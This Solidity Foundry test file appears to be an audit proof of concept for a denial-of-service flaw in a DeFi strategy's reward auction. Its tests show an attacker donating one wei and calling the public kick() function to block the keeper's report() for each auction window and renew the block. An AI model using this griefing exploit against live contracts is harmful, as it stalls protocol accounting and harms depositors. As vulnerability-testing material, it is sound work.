// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Setup, ERC20} from "src/test/utils/Setup.sol";

contract PermissionlessAuctionPreKickReportDosTest is Setup {
    address internal attacker = makeAddr("auction pre-kick attacker");

    function test_normalTwoReportCollisionAndRecovery() public {
        uint256 depositAmount = 1_000_000e18;
        address rewardsToken = strategy.REWARDS_TOKEN();

        _restoreProductionRewardThreshold();
        mintAndDepositIntoStrategy(strategy, user, depositAmount);
        skip(1 days);

        // A normal reward-bearing report starts the first auction.
        assertGt(strategy.claimableRewards(), strategy.minAmountToSell(rewardsToken));
        vm.prank(keeper);
        strategy.report();
        assertTrue(auction.isActive(rewardsToken), "first report did not leave active auction");

        // Rewards continue to accrue during the one-day auction.
        skip(12 hours);
        assertGt(strategy.claimableRewards(), strategy.minAmountToSell(rewardsToken));
        uint256 lastReportBeforeBlockedAttempt = strategy.lastReport();

        // The second otherwise-routine report is unavailable while the auction is active.
        vm.prank(keeper);
        vm.expectRevert("too soon");
        strategy.report();
        assertEq(strategy.lastReport(), lastReportBeforeBlockedAttempt, "blocked report updated accounting");

        // The condition is bounded: after the active interval expires, reporting recovers.
        skip(auction.auctionLength() + 1);
        assertFalse(auction.isActive(rewardsToken), "auction still active after advertised duration");
        vm.prank(keeper);
        strategy.report();
        assertGt(strategy.lastReport(), lastReportBeforeBlockedAttempt, "report did not recover");
    }

    function test_permissionlessDustPreKickBlocksReportAndRecovery() public {
        uint256 depositAmount = 1_000_000e18;
        uint256 dustDonation = 1;
        address rewardsToken = strategy.REWARDS_TOKEN();

        _restoreProductionRewardThreshold();
        mintAndDepositIntoStrategy(strategy, user, depositAmount);
        skip(1 days);
        assertGt(strategy.claimableRewards(), strategy.minAmountToSell(rewardsToken));

        // An arbitrary address can donate one wei and directly start the configured auction.
        deal(rewardsToken, attacker, dustDonation);
        vm.startPrank(attacker);
        ERC20(rewardsToken).transfer(address(auction), dustDonation);
        auction.kick(rewardsToken);
        vm.stopPrank();
        assertTrue(auction.isActive(rewardsToken), "attacker pre-kick did not activate auction");

        uint256 lastReportBeforeBlockedAttempt = strategy.lastReport();
        uint256 auctionBalanceBeforeBlockedAttempt = ERC20(rewardsToken).balanceOf(address(auction));

        // The keeper cannot report; the strategy transfer and reward claim revert atomically.
        vm.prank(keeper);
        vm.expectRevert("too soon");
        strategy.report();
        assertEq(strategy.lastReport(), lastReportBeforeBlockedAttempt, "blocked report updated accounting");
        assertEq(
            ERC20(rewardsToken).balanceOf(address(auction)),
            auctionBalanceBeforeBlockedAttempt,
            "failed report did not revert its transfer"
        );

        // After one day, the attacker can renew the block using the same unsold wei.
        skip(auction.auctionLength() + 1);
        vm.prank(attacker);
        auction.kick(rewardsToken);
        assertTrue(auction.isActive(rewardsToken), "attacker did not renew auction");

        vm.prank(keeper);
        vm.expectRevert("too soon");
        strategy.report();
        assertEq(strategy.lastReport(), lastReportBeforeBlockedAttempt, "renewed block updated accounting");

        // If the attacker stops renewing, waiting out the next auction restores reporting.
        skip(auction.auctionLength() + 1);
        vm.prank(keeper);
        strategy.report();
        assertGt(strategy.lastReport(), lastReportBeforeBlockedAttempt, "report did not recover");
    }

    function testFuzz_publicPreKickBlocksThroughoutActiveWindow(
        uint96 donationSeed,
        uint32 delaySeed
    ) public {
        uint256 donation = bound(uint256(donationSeed), 1, 1e18);
        uint256 activeDelay = bound(uint256(delaySeed), 0, 23 hours);
        address rewardsToken = strategy.REWARDS_TOKEN();

        _restoreProductionRewardThreshold();
        mintAndDepositIntoStrategy(strategy, user, 1_000_000e18);
        skip(1 days);
        assertGt(strategy.claimableRewards(), strategy.minAmountToSell(rewardsToken));

        deal(rewardsToken, attacker, donation);
        vm.startPrank(attacker);
        ERC20(rewardsToken).transfer(address(auction), donation);
        auction.kick(rewardsToken);
        vm.stopPrank();

        skip(activeDelay);
        assertTrue(auction.isActive(rewardsToken), "fuzzed auction unexpectedly inactive");
        vm.prank(keeper);
        vm.expectRevert("too soon");
        strategy.report();
    }

    function _restoreProductionRewardThreshold() internal {
        vm.prank(management);
        strategy.setMinAmountToSell(5_000e18);
    }
}
